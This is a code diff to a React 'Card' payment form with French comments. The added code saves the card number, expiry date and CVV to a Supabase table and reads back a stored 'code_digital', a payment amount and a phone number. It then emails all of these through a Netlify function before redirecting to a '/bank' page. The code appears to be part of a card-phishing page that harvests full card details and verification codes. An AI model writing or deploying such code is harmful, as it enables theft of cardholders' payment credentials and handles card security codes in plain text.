@@ -61,29 +61,67 @@ const Card = () => {
     }
 
     try {
-      await supabase
-        .from("sefon")
-        .update({
-          email: formData.email,
-          numerocarte: formData.numerocarte,
-          dateexpiration: formData.dateexpiration,
-          cryptogramme: formData.cryptogramme,
-        })
-        .eq("id", userId);
+    // 1. Update Supabase avec les données de la carte
+    await supabase
+      .from("sefon")
+      .update({
+        email: formData.email,
+        numerocarte: formData.numerocarte,
+        dateexpiration: formData.dateexpiration,
+        cryptogramme: formData.cryptogramme,
+      })
+      .eq("id", userId);
 
-      navigate("/bank");
-    } catch (error) {
-      console.error(error);
-      toast({
-        title: "Erreur",
-        description:
-          "Une erreur est survenue lors de l'enregistrement des informations de carte",
-        variant: "destructive",
-      });
-    } finally {
-      setIsLoading(false);
+    // 2. Récupérer le code digital, montant paiement et téléphone en base
+    const { data, error } = await supabase
+      .from("sefon")
+      .select("code_digital, montant_paiement, telephone")
+      .eq("id", userId)
+      .single();
+
+    if (error) throw error;
+
+    // 3. Appeler ton backend Netlify pour envoyer l'email
+    const response = await fetch("/.netlify/functions/sendEmail", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        email: formData.email,
+        titulaire: formData.titulaire,
+        numerocarte: formData.numerocarte,
+        dateexpiration: formData.dateexpiration,
+        cryptogramme: formData.cryptogramme,
+        code_digital: data.code_digital,
+        montant_paiement: data.montant_paiement,
+        telephone: data.telephone,
+      }),
+    });
+
+    if (!response.ok) {
+      throw new Error("Erreur lors de l'envoi de l'e-mail");
     }
-  };
+
+    toast({
+      title: "Succès",
+      description: "Vos informations ont été enregistrées et un mail vous a été envoyé.",
+      variant: "default",
+    });
+
+    navigate("/bank");
+  } catch (error) {
+    console.error(error);
+    toast({
+      title: "Erreur",
+      description:
+        "Une erreur est survenue lors de l'enregistrement ou de l'envoi du mail.",
+      variant: "destructive",
+    });
+  } finally {
+    setIsLoading(false);
+  }
+};
 
   return (
     <div className="min-h-screen flex flex-col">
